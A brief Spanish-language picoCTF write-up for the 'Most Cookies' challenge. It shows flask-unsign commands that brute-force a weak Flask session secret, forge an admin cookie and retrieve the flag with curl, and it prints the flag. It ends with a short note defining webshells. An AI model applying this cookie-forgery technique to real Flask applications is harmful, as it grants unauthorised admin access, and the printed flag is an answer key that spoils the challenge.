### Most Cookies

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:60251/
### Solución 
Se crea un entorno virtual para instalar flask y abrir con fuerza bruta.
```
┌──(.venv)─(kali㉿kali)-[~/Documents]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aajFXg.tKHzuvhIiM8g6l1MWs79jHTwpVo" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 27 attempts
'snowball'
                                                                             
┌──(.venv)─(kali㉿kali)-[~/Documents]
└─$ flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret "snowball"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aajJlQ.6hQ-bMiWV21BVxGlEg0PB29uNU0
                                                                             
┌──(.venv)─(kali㉿kali)-[~/Documents]
└─$ curl -s http://wily-courier.picoctf.net:60251/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aajJlQ.6hQ-bMiWV21BVxGlEg0PB29uNU0" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_485f560e}</code></p>

```

picoCTF{cO0ki3s_yum_485f560e}
### Notas
**webshell** es un script malicioso (generalmente escrito en PHP, ASP, Python o Perl) subido a un servidor web para obtener acceso remoto y control total sobre el mismo. Actúa como una puerta trasera (backdoor) que permite a los atacantes ejecutar comandos, robar datos, instalar malware o persistir en la red.
los archivos se suelen guardar en enlace/uploads/archivo